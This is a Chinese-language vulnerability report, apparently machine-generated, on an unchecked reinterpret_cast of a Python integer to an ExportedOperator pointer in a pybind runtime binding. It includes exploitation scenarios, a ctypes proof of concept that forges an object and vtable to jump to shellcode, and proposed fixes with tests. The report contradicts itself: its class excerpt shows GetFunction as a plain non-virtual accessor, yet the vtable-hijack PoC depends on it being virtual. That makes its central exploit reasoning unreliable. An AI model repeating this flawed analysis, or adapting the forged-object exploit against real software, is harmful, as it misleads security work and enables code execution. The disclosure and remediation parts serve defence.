# VULN-DF-MEM-003：reinterpret_cast强制转换致任意代码执行

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞 ID** | VULN-DF-MEM-003 |
| **类型** | 内存损坏 (Memory Corruption) |
| **CWE** | CWE-787: Out-of-bounds Write |
| **严重性** | Critical |
| **置信度** | 85 |
| **状态** | CONFIRMED |
| **发现者** | dataflow-scanner |

## 漏洞位置

| 文件 | 行号 | 函数 |
|------|------|------|
| python/src/bindings/runtime.cpp | 244-250 | OperatorDeviceRunOnceDataFromDevice |

## 漏洞性质

此漏洞是一个**独立的任意代码执行漏洞**。Python 用户传入的整数被直接 `reinterpret_cast` 为 `ExportedOperator*` 指针，随后调用该指针的方法。攻击者可构造恶意地址实现代码执行。

## 漏洞代码

```cpp
// runtime.cpp:232-284
std::string OperatorDeviceRunOnceDataFromDevice(
    [[maybe_unused]] py::int_ pythonOperatorPython,
    [[maybe_unused]] const std::vector<DeviceTensorData>& inputs,
    [[maybe_unused]] const std::vector<DeviceTensorData>& outputs,
    [[maybe_unused]] py::int_ incomingStreamPython,
    [[maybe_unused]] py::int_ workspaceData,
    [[maybe_unused]] py::int_ devCtrlCache)
{
    // ...
#ifdef BUILD_WITH_CANN
    auto opAddr = static_cast<uintptr_t>(pythonOperatorPython);  // 从 Python int 转
    if (opAddr == 0) {                                            // 仅检查 null
        return "invalid operator";
    }

    ExportedOperator* op = reinterpret_cast<ExportedOperator*>(opAddr);  // ← 危险！
    Function* func = op->GetFunction();  // ← 调用任意地址的虚函数
    // ...
```

## 问题分析

### 1. 仅检查 null 指针

```cpp
if (opAddr == 0) {
    return "invalid operator";
}
```

这只防止了 null 指针，但：
- **任意非零地址**：攻击者传入任何非零地址都能通过检查
- **无效地址**：`0xdeadbeef` 会通过检查，但指向无效内存
- **恶意地址**：攻击者构造指向恶意代码的地址

### 2. reinterpret_cast 无验证

```cpp
ExportedOperator* op = reinterpret_cast<ExportedOperator*>(opAddr);
```

`reinterpret_cast` 是最危险的类型转换：
- 不进行任何类型检查
- 不验证指针有效性
- 直接将整数解释为对象指针

### 3. 调用虚函数

```cpp
Function* func = op->GetFunction();
```

`ExportedOperator` 有虚函数（继承自 `CachedOperator`）。调用虚函数：
- 访问虚函数表 (vtable)
- 从 vtable 读取函数指针
- 调用该函数指针

如果 `op` 指向攻击者控制的内存：
- 攻击者伪造 vtable
- vtable 中的函数指针指向攻击者代码
- 调用虚函数时执行攻击者代码

## ExportedOperator 类分析

```cpp
// device_launcher_binding.h:297-321
class ExportedOperator : public CachedOperator {
public:
    void ResetFunction(Function* func) { func_ = Program::GetInstance().GetFunctionSharedPtr(func); }
    Function* GetFunction() const { return func_.get(); }  // ← 虚函数调用
    // ...
private:
    std::shared_ptr<Function> func_;
};
```

`GetFunction()` 返回 `func_.get()`。如果攻击者构造假的 `ExportedOperator`：
- 控制 `func_` 指针
- 可以让 `func_.get()` 返回任意地址
- 后续调用 `func` 的方法将进一步扩大攻击面

## 攻击路径

```
Python int (任意值)
    ↓
static_cast<uintptr_t>(pythonOperatorPython)
    ↓
opAddr != 0 ? (仅检查 null)
    ↓
reinterpret_cast<ExportedOperator*>(opAddr)
    ↓
op->GetFunction()  // 虚函数调用
    ↓
读取 vtable → 读取函数指针 → 执行代码
```

## 利用场景

### 场景 1: 伪造对象实现代码执行

```python
import pypto_impl

# 步骤 1: 分配可控内存区域
controlled_memory = allocate_aligned_memory(4096)

# 步骤 2: 构造假的 ExportedOperator 结构
# 需要知道 ExportedOperator 的内存布局
fake_op = construct_fake_exported_operator(controlled_memory)

# 步骤 3: 伪造 vtable 指向 shellcode
fake_vtable = construct_vtable_with_shellcode()

# 步骤 4: 让 fake_op 的 vptr 指向 fake_vtable
setup_vtable_pointer(fake_op, fake_vtable)

# 步骤 5: 传入假对象的地址
fake_addr = get_address(fake_op)
pypto_impl.OperatorDeviceRunOnceDataFromDevice(
    fake_addr,  # Python int → ExportedOperator*
    [],
    [],
    stream_addr,
    workspace_addr,
    ctrl_cache_addr
)

# GetFunction() 被调用时：
# 1. 访问 fake_op 的 vptr
# 2. vptr 指向 fake_vtable
# 3. fake_vtable 中的 GetFunction 指向 shellcode
# 4. shellcode 执行
```

### 场景 2: 利用现有对象实现信息泄露

```python
# 如果知道某个 ExportedOperator 的真实地址
known_op_addr = 0x7fff12340000  # 通过其他漏洞获取

# 传入该地址，获取 Function* 地址
pypto_impl.OperatorDeviceRunOnceDataFromDevice(
    known_op_addr,
    [],
    [],
    stream_addr,
    workspace_addr,
    ctrl_cache_addr
)

# 虽然这不是攻击，但可以用于信息泄露
# 如果攻击者控制了该 ExportedOperator 的内存内容
```

### 场景 3: 结合其他漏洞

```python
# 结合 VULN-DF-MEM-001 写入伪造对象
# 1. 通过 MEM-001 在目标地址写入伪造的 ExportedOperator
# 2. 通过 MEM-003 调用该伪造对象
# 3. 实现完整的代码执行链

# 写入伪造对象
fake_op_data = construct_fake_operator_bytes()
write_to_address(target_addr, fake_op_data)  # 使用 MEM-001

# 调用伪造对象
pypto_impl.OperatorDeviceRunOnceDataFromDevice(
    target_addr,  # 指向我们写入的伪造对象
    [],
    [],
    stream_addr,
    workspace_addr,
    ctrl_cache_addr
)
```

## 完整攻击链示例

```python
#!/usr/bin/env python3
"""
PoC: Arbitrary Code Execution via ExportedOperator reinterpret_cast
"""

import pypto_impl
import ctypes

def exploit_code_execution(shellcode_addr):
    # 构造最小化的假 ExportedOperator
    # ExportedOperator 继承 CachedOperator，需要正确的 vtable
    
    # 分配内存存放假对象
    fake_op_buffer = ctypes.create_string_buffer(512)
    fake_op_addr = ctypes.addressof(fake_op_buffer)
    
    # 假设我们知道 vtable 的偏移和结构
    # (实际攻击需要逆向工程确定)
    
    # 设置 vptr 指向可控区域
    vtable_offset = 0  # 通常在对象开头
    fake_vtable_addr = fake_op_addr + 256  # vtable 在对象后面
    
    # 写入 vptr
    ctypes.memmove(
        fake_op_buffer + vtable_offset,
        ctypes.c_void_p(fake_vtable_addr),
        8
    )
    
    # 构造 vtable，GetFunction() 指向 shellcode
    # vtable[GetFunction_index] = shellcode_addr
    get_function_index = 1  # 假设的索引，需要实际逆向
    ctypes.memmove(
        fake_op_buffer + 256 + get_function_index * 8,
        ctypes.c_void_p(shellcode_addr),
        8
    )
    
    # 触发调用
    pypto_impl.OperatorDeviceRunOnceDataFromDevice(
        fake_op_addr,
        [],
        [],
        0x1000,  # stream (任意值)
        0x2000,  # workspace (任意值)
        0x3000   # ctrl_cache (任意值)
    )
    
    # GetFunction() 被调用，执行 shellcode

# 使用示例
shellcode = prepare_shellcode()
exploit_code_execution(get_shellcode_addr(shellcode))
```

## 影响范围

| 影响 | 说明 |
|------|------|
| **代码执行** | 直接的任意代码执行能力 |
| **虚函数劫持** | 通过伪造 vtable 控制执行流 |
| **权限提升** | 结合其他技术可能提升权限 |
| **持久化** | 可植入后门代码 |

## 与攻击链漏洞的区别

| 特征 | MEM-003 | MEM-001 攻击链 |
|------|---------|---------------|
| **漏洞类型** | 代码执行 | 内存读写 |
| **触发方式** | 调用虚函数 | 内存拷贝 |
| **攻击复杂度** | 高（需伪造对象） | 中（直接读写） |
| **独立利用** | 可以独立利用 | 可独立利用 |
| **组合威力** | 可组合实现完整 RCE | 提供写入能力 |

## 修复建议

### 方案 1: 移除危险的 reinterpret_cast

```cpp
// 使用安全的对象管理，不接受裸指针
std::string OperatorDeviceRunOnceDataFromDevice(
    pypto_impl.ExportedOperatorWrapper wrapper,  // 使用包装类
    const std::vector<DeviceTensorData>& inputs,
    // ...
)
{
    ExportedOperator* op = wrapper.GetValidatedOperator();
    if (op == nullptr) {
        return "invalid operator";
    }
    // ...
}
```

### 方案 2: 添加对象验证

```cpp
std::string OperatorDeviceRunOnceDataFromDevice(
    py::int_ pythonOperatorPython,
    // ...
)
{
    auto opAddr = static_cast<uintptr_t>(pythonOperatorPython);
    
    // 新增：验证地址是否指向有效的 ExportedOperator
    ExportedOperator* op = ValidateAndGetOperator(opAddr);
    if (op == nullptr) {
        return "invalid operator";
    }
    
    Function* func = op->GetFunction();
    // ...
}

ExportedOperator* ValidateAndGetOperator(uintptr_t addr) {
    // 检查地址是否在已知对象池中
    auto& registry = OperatorRegistry::GetInstance();
    return registry.Lookup(addr);  // 只有注册的对象才能使用
}
```

### 方案 3: 使用安全的句柄系统

```cpp
// 不直接传递指针，使用句柄
class OperatorHandle {
    uint64_t handle_id_;
public:
    ExportedOperator* Resolve() {
        return OperatorManager::ResolveHandle(handle_id_);
    }
};

// Python 端传递句柄，C++ 端解析
py::class_<OperatorHandle>(m, "OperatorHandle")
    .def(py::init<uint64_t>())
    .def("resolve", &OperatorHandle::Resolve);
```

### 方案 4: 限制调用条件

```cpp
// 只允许从特定来源获取 Operator
uintptr_t OperatorBegin() {
    ExportedOperator* op = ExportedOperatorBegin();
    auto opAddr = reinterpret_cast<uintptr_t>(op);
    OperatorRegistry::Register(op);  // 注册有效对象
    return opAddr;
}

void OperatorEnd(uintptr_t opAddr) {
    OperatorRegistry::Unregister(opAddr);  // 移除注册
    ExportedOperator* op = reinterpret_cast<ExportedOperator*>(opAddr);
    ExportedOperatorEnd(op);
}
```

## 修复验证

```cpp
// 测试：无效地址应被拒绝
TEST(OperatorDeviceRunOnceDataFromDevice, RejectInvalidAddress) {
    py::int_ invalid_addr(0xdeadbeef);
    auto result = OperatorDeviceRunOnceDataFromDevice(
        invalid_addr, {}, {}, py::int_(0), py::int_(0), py::int_(0)
    );
    EXPECT_EQ(result, "invalid operator");
}

// 测试：有效对象应被接受
TEST(OperatorDeviceRunOnceDataFromDevice, AcceptValidOperator) {
    uintptr_t valid_addr = OperatorBegin();  // 通过正规流程获取
    py::int_ addr(valid_addr);
    auto result = OperatorDeviceRunOnceDataFromDevice(
        addr, valid_inputs, valid_outputs, stream, ws, cache
    );
    EXPECT_TRUE(result.empty() || result == "success");
}
```

## 参考链接

- CWE-787: Out-of-bounds Write
- CWE-123: Write-what-where Condition
- C++ 虚函数安全指南
- Vtable 劫持攻击技术